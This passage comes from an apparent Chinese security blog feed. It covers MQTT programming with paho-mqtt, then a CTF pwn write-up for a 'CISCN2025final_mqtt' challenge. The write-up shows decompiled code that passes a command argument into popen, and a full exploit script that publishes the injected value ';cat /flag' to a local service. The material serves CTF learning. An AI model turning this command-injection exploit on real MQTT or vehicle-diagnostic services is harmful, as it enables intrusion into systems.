paho-mqtt&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;订阅者（Subscriber）&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;import paho.mqtt.client as mqtt&#xD;&#xA;&#xD;&#xA;# 当客户端连接 broker 成功时回调&#xD;&#xA;def on_connect(client, userdata, flags, rc):&#xD;&#xA;    print(&amp;#34;Connected with result code&amp;#34;, rc)&#xD;&#xA;    client.subscribe(&amp;#34;test/topic&amp;#34;)&#xD;&#xA;&#xD;&#xA;# 当收到消息时回调&#xD;&#xA;def on_message(client, userdata, msg):&#xD;&#xA;    print(f&amp;#34;[{msg.topic}] {msg.payload.decode()}&amp;#34;)&#xD;&#xA;&#xD;&#xA;client = mqtt.Client()&#xD;&#xA;client.on_connect = on_connect&#xD;&#xA;client.on_message = on_message&#xD;&#xA;&#xD;&#xA;client.connect(&amp;#34;broker.emqx.io&amp;#34;, 1883, 60)&#xD;&#xA;client.loop_forever()&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;发布者（Publisher）&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;import paho.mqtt.client as mqtt&#xD;&#xA;&#xD;&#xA;client = mqtt.Client()&#xD;&#xA;client.connect(&amp;#34;broker.emqx.io&amp;#34;, 1883, 60)&#xD;&#xA;&#xD;&#xA;client.publish(&amp;#34;test/topic&amp;#34;, &amp;#34;Hello MQTT from Python!&amp;#34;)&#xD;&#xA;client.disconnect()&lt;/code&gt;&lt;/pre&gt;&lt;h6 class=&#34;heading-element&#34; id=&#34;api&#34;&gt;&lt;span&gt;API&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#api&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h6&gt;&lt;p&gt;&lt;strong&gt;创建与配置客户端&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;import paho.mqtt.client as mqtt&#xD;&#xA;&#xD;&#xA;# 创建客户端实例&#xD;&#xA;client = mqtt.Client(client_id=&amp;#34;&amp;#34;, clean_session=True, userdata=None, protocol=mqtt.MQTTv311, transport=&amp;#34;tcp&amp;#34;)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;参数说明：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;client_id&lt;/code&gt;：客户端 ID，默认为随机。broker 用它区分不同客户端。&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;clean_session&lt;/code&gt;：是否清除会话（True = 断开后不保留订阅信息）。&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;protocol&lt;/code&gt;：MQTT 协议版本（MQTTv311、MQTTv31、MQTTv5）。&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;transport&lt;/code&gt;：传输方式（默认 &lt;code&gt;&amp;quot;tcp&amp;quot;&lt;/code&gt;，也支持 &lt;code&gt;&amp;quot;websockets&amp;quot;&lt;/code&gt;）。&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;认证&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;client.username_pw_set(username=&amp;#34;user&amp;#34;, password=&amp;#34;pass&amp;#34;)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;连接与断开&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;client.connect(host=&amp;#34;broker.emqx.io&amp;#34;, port=1883, keepalive=60)&#xD;&#xA;client.disconnect()&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;host&lt;/code&gt;：MQTT 服务器地址&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;port&lt;/code&gt;：端口，默认 1883&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;发布与订阅&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;#订阅&#xD;&#xA;client.subscribe(&amp;#34;test/topic&amp;#34;, qos=1)&#xD;&#xA;#取消订阅&#xD;&#xA;client.unsubscribe(&amp;#34;test/topic&amp;#34;)&#xD;&#xA;#发布&#xD;&#xA;client.publish(&amp;#34;test/topic&amp;#34;, payload=&amp;#34;hello&amp;#34;, qos=1, retain=False)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;发布参数：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;payload&lt;/code&gt;：消息内容（字符串、字节）&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;qos&lt;/code&gt;：QoS 等级（0/1/2）&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;retain&lt;/code&gt;：是否保留消息&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;阻塞循环&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;#最常用&#xD;&#xA;client.loop_forever()&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;回调函数&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;这些函数需要绑定到 client 上&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;#连接成功&#xD;&#xA;def on_connect(client, userdata, flags, rc):&#xD;&#xA;    print(&amp;#34;Connected with result code&amp;#34;, rc)&#xD;&#xA;client.on_connect = on_connect&#xD;&#xA;&#xD;&#xA;#收到消息&#xD;&#xA;def on_message(client, userdata, msg):&#xD;&#xA;    print(f&amp;#34;{msg.topic}: {msg.payload.decode()}&amp;#34;)&#xD;&#xA;client.on_message = on_message&#xD;&#xA;&#xD;&#xA;#断开连接&#xD;&#xA;def on_disconnect(client, userdata, rc):&#xD;&#xA;    print(&amp;#34;Disconnected with result code&amp;#34;, rc)&#xD;&#xA;client.on_disconnect = on_disconnect&#xD;&#xA;&#xD;&#xA;#发布消息结果&#xD;&#xA;def on_publish(client, userdata, mid):&#xD;&#xA;    print(&amp;#34;Message published, mid:&amp;#34;, mid)&#xD;&#xA;client.on_publish = on_publish&#xD;&#xA;&#xD;&#xA;#订阅结果&#xD;&#xA;def on_subscribe(client, userdata, mid, granted_qos):&#xD;&#xA;    print(&amp;#34;Subscribed, mid:&amp;#34;, mid, &amp;#34;QoS:&amp;#34;, granted_qos)&#xD;&#xA;client.on_subscribe = on_subscribe&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;参数说明：&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;on_connect(client, userdata, flags, rc)&lt;/code&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;client&lt;/strong&gt;：当前 &lt;code&gt;Client&lt;/code&gt; 实例（就是 &lt;code&gt;mqtt.Client()&lt;/code&gt; 返回的对象）。&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;userdata&lt;/strong&gt;：用户自定义数据（如果你调用过 &lt;code&gt;client.user_data_set(obj)&lt;/code&gt;，这里会传入那个 &lt;code&gt;obj&lt;/code&gt;）。&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;flags&lt;/strong&gt;：字典，包含连接时的标志位信息，比如：&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;flags[&amp;quot;session present&amp;quot;]&lt;/code&gt;：表示这次会话是否是新建的 (&lt;code&gt;0&lt;/code&gt; 新建，&lt;code&gt;1&lt;/code&gt; 表示恢复之前的会话)。&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;rc&lt;/strong&gt;：连接结果码（Return Code）：&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;0&lt;/code&gt; → 成功连接&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;1&lt;/code&gt; → 协议版本错误&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;2&lt;/code&gt; → 客户端 ID 无效&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;3&lt;/code&gt; → 服务器不可用&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;4&lt;/code&gt; → 用户名/密码错误&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;5&lt;/code&gt; → 未授权&lt;/li&gt;&#xA;&lt;li&gt;其他值 → 未知错误&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;code&gt;on_message(client, userdata, msg)&lt;/code&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;client&lt;/strong&gt;：同上，客户端实例。&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;userdata&lt;/strong&gt;：同上，自定义数据。&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;msg&lt;/strong&gt;：&lt;code&gt;MQTTMessage&lt;/code&gt; 对象，包含收到的消息：&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;msg.topic&lt;/code&gt; → 消息主题（字符串）&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;msg.payload&lt;/code&gt; → 消息内容（bytes，需要 &lt;code&gt;.decode()&lt;/code&gt;）&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;msg.qos&lt;/code&gt; → 消息 QoS 等级（0/1/2）&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;msg.retain&lt;/code&gt; → 是否是保留消息（布尔值）&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;code&gt;on_disconnect(client, userdata, rc)&lt;/code&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;client&lt;/strong&gt;：客户端实例。&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;userdata&lt;/strong&gt;：自定义数据。&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;rc&lt;/strong&gt;：断开原因码：&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;0&lt;/code&gt; → 正常断开&lt;/li&gt;&#xA;&lt;li&gt;非 &lt;code&gt;0&lt;/code&gt; → 意外断开（例如网络中断、broker 关闭连接等）&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;code&gt;on_publish(client, userdata, mid)&lt;/code&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;client&lt;/strong&gt;：客户端实例。&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;userdata&lt;/strong&gt;：自定义数据。&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;mid&lt;/strong&gt;：消息 ID（Message ID），用来唯一标识这条发布的消息。&#xA;&lt;ul&gt;&#xA;&lt;li&gt;如果你调用 &lt;code&gt;client.publish()&lt;/code&gt;，这个 mid 会告诉你是哪一条消息被 broker 确认了。&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;code&gt;on_subscribe(client, userdata, mid, granted_qos)&lt;/code&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;client&lt;/strong&gt;：客户端实例。&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;userdata&lt;/strong&gt;：自定义数据。&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;mid&lt;/strong&gt;：消息 ID（对应你调用 &lt;code&gt;client.subscribe()&lt;/code&gt; 时生成的 ID）。&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;granted_qos&lt;/strong&gt;：broker 实际给你分配的 QoS（可能比你请求的低）。&#xA;&lt;ul&gt;&#xA;&lt;li&gt;比如你请求 &lt;code&gt;qos=2&lt;/code&gt;，但 broker 只支持 &lt;code&gt;qos=1&lt;/code&gt;，那返回值就是 &lt;code&gt;[1]&lt;/code&gt;。&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;模板&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&lt;/code&gt;&lt;/pre&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;例题&#34;&gt;&lt;span&gt;例题&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e4%be%8b%e9%a2%98&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h4&gt;&lt;h5 class=&#34;heading-element&#34; id=&#34;ciscn2025final_mqtt&#34;&gt;&lt;span&gt;CISCN2025final_mqtt&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#ciscn2025final_mqtt&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h5&gt;&lt;pre&gt;&lt;code&gt;ln -sfn libpaho-mqtt3c.so.1.3.9 libpaho-mqtt3c.so.1&#xD;&#xA;ln -sfn libcjson.so.1.7.15 libcjson.so.1&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;__int64 __fastcall main(int a1, char **a2, char **a3)&#xD;&#xA;{&#xD;&#xA;&#x9;// ...&#xD;&#xA;  if ( read_file(&amp;#34;/mnt/VIN&amp;#34;) &amp;amp;&amp;amp; read_file(&amp;#34;/mnt/version&amp;#34;) )&#xD;&#xA;  {&#xD;&#xA;&#x9;// ...&#xD;&#xA;  }&#xD;&#xA;  fwrite(&amp;#34;miss file.\n&amp;#34;, 1u, 0xBu, stderr);&#xD;&#xA;  return 1;&#xD;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;需要创建两个文件&lt;/p&gt;&#xA;&lt;p&gt;条件竞争的题，会创建多个线程&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;      else if ( !strcmp(cmd, &amp;#34;set_vin&amp;#34;) )&#xD;&#xA;      {&#xD;&#xA;        if ( (unsigned int)sub_158A(arg) )&#xD;&#xA;        {&#xD;&#xA;          sleep(2u);&#xD;&#xA;          snprintf(s, 0x100u, &amp;#34;echo -n %s&amp;gt;/mnt/VIN;cat /mnt/VIN&amp;#34;, arg);&#xD;&#xA;          puts(s);&#xD;&#xA;          v4 = popen(s, &amp;#34;r&amp;#34;);&#xD;&#xA;          ptr = 0x203A746572LL;&#xD;&#xA;          v10 = 0;&#xD;&#xA;          v11 = 0;&#xD;&#xA;          v12 = 0;&#xD;&#xA;          v13 = 0;&#xD;&#xA;          v14 = 0;&#xD;&#xA;          v15 = 0;&#xD;&#xA;          v16 = 0;&#xD;&#xA;          fread((char *)&amp;amp;ptr &amp;#43; 5, 1u, 0x3Fu, v4);&#xD;&#xA;          pclose(v4);&#xD;&#xA;          puts((const char *)&amp;amp;ptr);&#xD;&#xA;          publish_msg((const char *)&amp;amp;ptr);&#xD;&#xA;          strncpy(dest_VIN_bss, arg, 0x3Fu);&#xD;&#xA;          encode_to((__int64)dest_VIN_bss, VIN_encode);&#xD;&#xA;        }&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;exp:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;#! /usr/bin/python3&#xD;&#xA;import random&#xD;&#xA;from pwn import *&#xD;&#xA;import time&#xD;&#xA;import paho.mqtt.client as mqtt&#xD;&#xA;import json&#xD;&#xA;context(log_level = &amp;#34;debug&amp;#34;,os = &amp;#34;linux&amp;#34;,arch = &amp;#34;amd64&amp;#34;)&#xD;&#xA;pwnFile = &amp;#34;./pwn&amp;#34;&#xD;&#xA;libcFile = &amp;#34;./libc.so.6&amp;#34;&#xD;&#xA;ip = &amp;#34;127.0.0.1&amp;#34;&#xD;&#xA;local = &amp;#34;&amp;#34;&#xD;&#xA;local_port = 9999&#xD;&#xA;port = 9999&#xD;&#xA;elf = ELF(pwnFile)&#xD;&#xA;libc = ELF(libcFile)&#xD;&#xA;def debug(value):&#xD;&#xA;    if value==1:&#xD;&#xA;        io = process(pwnFile)&#xD;&#xA;    else:&#xD;&#xA;        io = remote(ip,port)&#xD;&#xA;    return io&#xD;&#xA;&#xD;&#xA;&#xD;&#xA;def dbg(msg=&amp;#34;&amp;#34;):&#xD;&#xA;    gdb.attach(io,msg)&#xD;&#xA;&#xD;&#xA;def publish(client,topic,auth,cmd,arg):&#xD;&#xA;    msg = {&#xD;&#xA;        &amp;#34;auth&amp;#34;:auth,&#xD;&#xA;        &amp;#34;cmd&amp;#34;:cmd,&#xD;&#xA;        &amp;#34;arg&amp;#34;:arg&#xD;&#xA;    }&#xD;&#xA;    result = client.publish(topic = topic, payload = json.dumps(msg))&#xD;&#xA;    print(json.dumps(msg))&#xD;&#xA;    print(result)&#xD;&#xA;    return result&#xD;&#xA;&#xD;&#xA;def on_connect(client, userdata, flags, rc):&#xD;&#xA;    client.subscribe(&amp;#34;vehicle_diag&amp;#34;)&#xD;&#xA;    client.subscribe(&amp;#34;diag&amp;#34;)&#xD;&#xA;    client.subscribe(&amp;#34;#&amp;#34;)  # 订阅所有&#xD;&#xA;    client.subscribe(&amp;#34;diag/resp&amp;#34;)&#xD;&#xA;    print(&amp;#34;Connected with result code &amp;#34; &amp;#43; str(rc))&#xD;&#xA;&#xD;&#xA;def on_subscribe(client,userdata,mid,granted_qos):&#xD;&#xA;    print(&amp;#34;消息发送成功&amp;#34;)&#xD;&#xA;&#xD;&#xA;def on_message(client, userdata, msg):&#xD;&#xA;    message = msg.payload.decode()# Decode message payload&#xD;&#xA;    print(f&amp;#34;Received message on topic &amp;#39;{msg.topic}&amp;#39;: {message}&amp;#34;)&#xD;&#xA;    # try:&#xD;&#xA;    #     data = json.loads(message)  # 解析为字典&#xD;&#xA;    #     dest = data.get(&amp;#34;vin&amp;#34;)  # 获取vin字段&#xD;&#xA;    #     log.success(&amp;#34;dest -&amp;gt; &amp;#34;&amp;#43; dest)&#xD;&#xA;    # except json.JSONDecodeError:&#xD;&#xA;    #     print(&amp;#34;JSON解析失败&amp;#34;)&#xD;&#xA;    print(message)&#xD;&#xA;&#xD;&#xA;def sum2hex(dest):&#xD;&#xA;    v3 = 0&#xD;&#xA;    for i in range(len(dest)):&#xD;&#xA;        v3 = (0x1f  * v3 &amp;#43;  ord(dest[i])) &amp;amp; 0xffffffff&#xD;&#xA;    log.success(f&amp;#34;sum2hex -&amp;gt; {v3:08x}&amp;#34;)&#xD;&#xA;    return  f&amp;#34;{v3:08x}&amp;#34;&#xD;&#xA;&#xD;&#xA;io = debug(0)&#xD;&#xA;#gdb.attach(io,&amp;#39;b *$rebase(0x1EC0)&amp;#39;)&#xD;&#xA;topic = &amp;#34;diag&amp;#34;&#xD;&#xA;client = mqtt.Client()&#xD;&#xA;&#xD;&#xA;client.on_connect = on_connect&#xD;&#xA;client.on_message = on_message&#xD;&#xA;client.on_subscribe = on_subscribe&#xD;&#xA;client.connect(host = &amp;#34;127.0.0.1&amp;#34;,port = 9999,keepalive=10000)   &#xD;&#xA;&#xD;&#xA;auth = sum2hex(&amp;#34;test&amp;#34;)&#xD;&#xA;&#xD;&#xA;publish(client,&amp;#34;diag&amp;#34;,auth,&amp;#34;set_vin&amp;#34;,&amp;#34;111111111111&amp;#34;)&#xD;&#xA;sleep(0.5)&#xD;&#xA;publish(client,&amp;#34;diag&amp;#34;,auth,&amp;#34;set_vin&amp;#34;,&amp;#34;;cat /flag&amp;#34;)&#xD;&#xA;publish(client,&amp;#34;diag&amp;#34;,auth,&amp;#34;set_vin&amp;#34;,&amp;#34;;cat /flag&amp;#34;)&#xD;&#xA;sleep(1)&#xD;&#xA;&#xD;&#xA;client.loop_start()&#xD;&#xA;&#xD;&#xA;io.interactive()&lt;/code&gt;&lt;/pre&gt;&lt;h5 class=&#34;heading-element&#34; id=&#34;湾区杯2024初赛&#34;&gt;&lt;span&gt;湾区杯2024初赛&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e6%b9%be%e5%8c%ba%e6%9d%af2024%e5%88%9d%e8%b5%9b&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h5&gt;&lt;h5 class=&#34;heading-element&#34; id=&#34;rwctf2022_who-moved-my-block&#34;&gt;&lt;span&gt;rwctf2022_Who Moved My Block&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#rwctf2022_who-moved-my-block&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h5&gt;&lt;p&gt;&lt;a href=&#34;https://r3kapig.com/writeup/20220125-rwctf4/#who-moved-my-block&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://r3kapig.com/writeup/20220125-rwctf4/#who-moved-my-block&lt;/a&gt;&lt;/p&gt;&#xA;&lt;h4 class=&#34;heading-element&#34; id=&#34;参考文章&#34;&gt;&lt;span&gt;参考文章&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e5%8f%82%e8%80%83%e6%96%87%e7%ab%a0&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h4&gt;&lt;p&gt;&lt;a href=&#34;https://bbs.kanxue.com/thread-287727.htm&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;mqtt 协议pwn入门&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>Protobuf笔记</title>
      <link>http://localhost:1313/posts/protobuf/</link>
      <pubDate>Mon, 02 Feb 2026 12:19:31 +0800</pubDate>
      <guid>http://localhost:1313/posts/protobuf/</guid>
      <category domain="http://localhost:1313/categories/pwn/">Pwn</category>
      <description>&lt;h3 class=&#34;heading-element&#34; id=&#34;安装使用&#34;&gt;&lt;span&gt;安装使用&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e5%ae%89%e8%a3%85%e4%bd%bf%e7%94%a8&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 